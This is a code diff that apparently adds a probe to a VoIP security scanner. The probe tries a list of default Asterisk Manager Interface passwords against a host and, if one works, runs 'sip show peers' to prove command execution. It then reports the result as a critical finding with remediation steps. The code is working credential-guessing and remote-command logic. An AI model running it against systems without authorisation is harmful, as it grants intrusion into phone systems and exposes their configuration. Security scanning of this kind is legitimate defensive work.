@@ -17,6 +17,10 @@ from __future__ import annotations
 
 import socket
 from dataclasses import dataclass, field
+from typing import TYPE_CHECKING
+
+if TYPE_CHECKING:
+    from .cve import CveResult
 
 
 DEFAULT_AMI_CREDS: list[tuple[str, str]] = [
@@ -273,3 +277,121 @@ def attack(
     else:
         result.evidence = "AMI port not reachable"
     return result
+
+
+# ---------------------------------------------------------------------------
+# probe_ami_default_creds — CveResult-based probe for check_all()
+# ---------------------------------------------------------------------------
+
+_PROBE_CREDS: list[tuple[str, str]] = [
+    ("admin", "amp111"),
+    ("admin", "admin"),
+    ("admin", "password"),
+    ("admin", ""),
+    ("asterisk", "asterisk"),
+    ("asterisk", ""),
+    ("user", "user"),
+]
+
+
+def probe_ami_default_creds(
+    host: str,
+    port: int = 5038,
+    timeout: float = 3.0,
+) -> "list[CveResult]":
+    from .cve import CveResult
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        s.connect((host, port))
+        s.settimeout(timeout)
+        raw = s.recv(2048)
+        banner = raw.decode("utf-8", errors="replace")
+    except (socket.timeout, OSError):
+        return []
+    finally:
+        try:
+            s.close()
+        except OSError:
+            pass
+
+    if "Asterisk Call Manager" not in banner:
+        return []
+
+    for u, p in _PROBE_CREDS:
+        cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        cs.settimeout(timeout)
+        try:
+            cs.connect((host, port))
+            cs.settimeout(timeout)
+            cs.recv(2048)   # discard banner
+            login_msg = (
+                f"Action: Login\r\nUsername: {u}\r\nSecret: {p}\r\n\r\n"
+            )
+            cs.sendall(login_msg.encode("utf-8"))
+            buf = b""
+            cs.settimeout(2.0)
+            while len(buf) < 4096:
+                try:
+                    chunk = cs.recv(1024)
+                except socket.timeout:
+                    break
+                if not chunk:
+                    break
+                buf += chunk
+                resp_text = buf.decode("utf-8", errors="replace")
+                if "Response: Success" in resp_text or "Response: Error" in resp_text:
+                    break
+            resp_text = buf.decode("utf-8", errors="replace")
+            if "Response: Success" not in resp_text:
+                continue
+
+            # Authenticated — run sip show peers as command-exec PoC
+            cmd_msg = "Action: Command\r\nCommand: sip show peers\r\n\r\n"
+            cs.sendall(cmd_msg.encode("utf-8"))
+            cmd_buf = b""
+            cs.settimeout(2.0)
+            while len(cmd_buf) < 4096:
+                try:
+                    chunk = cs.recv(1024)
+                except socket.timeout:
+                    break
+                if not chunk:
+                    break
+                cmd_buf += chunk
+            peer_snippet = cmd_buf[:2048].decode("utf-8", errors="replace")
+
+            return [CveResult(
+                cve_id="CONFIG-AMI-DEFAULT-CREDS",
+                platform="Asterisk",
+                severity="critical",
+                host=host,
+                port=port,
+                title=(
+                    "Asterisk AMI authenticated with default credentials — "
+                    "command execution confirmed (sip show peers)"
+                ),
+                evidence=(
+                    f"AMI login succeeded with username={u!r} password={p!r}. "
+                    f"'sip show peers' output: {peer_snippet!r}"
+                ),
+                remediation=(
+                    "Change AMI credentials immediately in /etc/asterisk/manager.conf. "
+                    "Bind AMI to 127.0.0.1 only. "
+                    "Use a strong, unique password (min 20 chars). "
+                    "Restrict access to AMI from trusted management hosts only."
+                ),
+                references=[
+                    "https://www.asterisk.org/asterisk-security-advisories/",
+                ],
+            )]
+        except (socket.timeout, OSError):
+            continue
+        finally:
+            try:
+                cs.close()
+            except OSError:
+                pass
+
+    return []
